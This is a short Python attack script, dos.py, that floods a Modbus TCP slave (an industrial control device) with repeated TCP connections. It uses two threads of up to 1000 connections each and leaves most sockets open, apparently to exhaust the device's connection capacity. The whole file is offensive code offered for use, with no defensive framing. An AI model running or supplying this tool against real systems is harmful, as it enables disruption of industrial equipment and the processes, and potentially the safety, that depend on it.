#! /usr/bin/env python3

'''
File: dos.py
Desc: Dos on a TCP MODBUS Slave
Version: 0.0.1
'''

__author__ = 'jd'

import subprocess, socket, threading, time
from optparse import OptionParser

class myThread (threading.Thread):
	def __init__(self, threadID, name, counter):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
	def run(self):
		print ("Starting " + self.name)
		# Get lock to synchronize threads
		threadLock.acquire()
		dos(self.name, self.counter, 1000)
		# Free lock to release next thread
		threadLock.release()

# clear terminal
subprocess.call('clear', shell = True)

# socket function
def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

# dos function
def dos(threadName, delay, counter):
	try:
		while counter:
			# connect to modbus slave
			print('Connecting to %s...' % host)
			s = connect()
			print('Connected.')
			#time.sleep(delay)
			print ("%s: %s" % (threadName, time.ctime(time.time())))
			counter -= 1
			
	except socket.error as e:
		print('ERROR: Could not connect to %s on port %s.' % (host, port))
		exit()

	finally:
		s.close()

if __name__ == '__main__':
	parser = OptionParser()

	parser.add_option('-a', '--address', dest='host', help='The host to connect to')
	parser.add_option('-p', '--port', dest='port', type='int', help='The port to use')

	(options, args) = parser.parse_args()

	host = options.host
	port = options.port

	try:
		try:
			threadLock = threading.Lock()
			threads = []

			# Create new threads
			thread1 = myThread(1, "Thread-1", 1)
			thread2 = myThread(2, "Thread-2", 2)

			# Start new Threads
			thread1.start()
			thread2.start()

			# Add threads to thread list
			threads.append(thread1)
			threads.append(thread2)

			# Wait for all threads to complete
			for t in threads:
			   t.join()
			print ("Exiting Main Thread")

		except:
			print ("Error: unable to start thread !")

		while 1:
			pass

	except KeyboardInterrupt:
		print('Ctrl-C happened\n')